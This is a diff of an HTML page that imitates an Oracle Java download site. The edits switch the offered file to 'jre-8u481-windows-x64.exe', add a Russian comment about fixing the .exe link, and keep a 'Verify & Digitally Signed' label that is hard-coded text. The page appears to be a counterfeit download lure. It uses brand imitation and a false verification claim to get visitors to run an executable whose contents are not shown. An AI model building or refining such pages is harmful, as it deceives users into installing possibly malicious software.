@@ -23,8 +23,6 @@
         .btn-oracle:hover { background: #e68a15; }
         .license-scroll { height: 180px; overflow-y: scroll; border: 1px solid #eee; background: #fafafa; padding: 15px; font-size: 11px; color: #777; margin: 25px 0; text-align: justify; }
         footer { background: #333; color: #777; padding: 50px 10%; font-size: 11px; margin-top: 50px; }
-        .footer-cols { display: flex; justify-content: space-between; }
-        .footer-cols a { color: #777; text-decoration: none; display: block; margin-bottom: 8px; }
     </style>
 </head>
 <body>
@@ -39,7 +37,7 @@
 </div>
 
 <header>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAACCklEQVRYR8VWy07DQBDtS6V+ASREAnHkh0B8An8An8An8An8An8An8An8An8An8AJA6RInHkk0BCAvW7vS67SbaTNo6Unclm7Z2dmZ19u7YOn89nS0pKYmN9fX07X19fn9ra2uY6Ojq68vLy9vT09B98fX0DfX19A319fX19fX19fX19fX19fX19fX19fX10DfX19A/0v6fLycjsvLy9fVlaWLy8vX15eXv76+vrv6+v76+vrv6+v/76+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+v7yS0vLzc3NzcXF5eXl5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5fX98Pr6+u/r6+vr6+vLycAAAAASUVORK5CYII=" width="30" alt="Java Logo">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAACCklEQVRYR8VWy07DQBDtS6V+ASREAnHkh0B8An8An8An8An8An8An8An8An8An8AJA6RInHkk0BCAvW7vS67SbaTNo6Unclm7Z2dmZ19u7YOn89nS0pKYmN9fX07X19fn9ra2uY6Ojq68vLy9vT09B98fX0DfX19A319fX19fX19fX19fX19fX19fX19fX10DfX19A/0v6fLycjsvLy9fVlaWLy8vX15eXv76+vrv6+v76+vrv6+v/76+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+v7yS0vLzc3NzcXF5eXl5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5fX98Pr6+u/r6+vr6+vLycAAAAASUVORK5CYII=" width="30" alt="Java Logo">
     <span class="logo-text">Java</span>
 </header>
 
@@ -70,14 +68,14 @@
 
         <div style="border: 1px solid #ddd; padding: 35px; background: #fff;">
             <div style="margin-bottom: 20px;">
-                <strong>Software:</strong> jre-8u481-windows-x64-deployment.zip<br>
+                <strong>Software:</strong> jre-8u481-windows-x64.exe<br>
                 <strong>Environment:</strong> Windows 10/11 x64 Service Pack 1+<br>
                 <strong>Package Type:</strong> Full Installer Bundle
             </div>
 
+            <!-- Ссылка исправлена: добавлено расширение .exe -->
             <a href="jre-8u481-windows-x64.exe" class="btn-oracle" download>Agree and Start Free Download</a>
 
-            
             <p style="font-size: 11px; color: #888; margin-top: 10px;">
                 Verification Status: <span style="color: green;">Verified & Digitally Signed</span>
             </p>
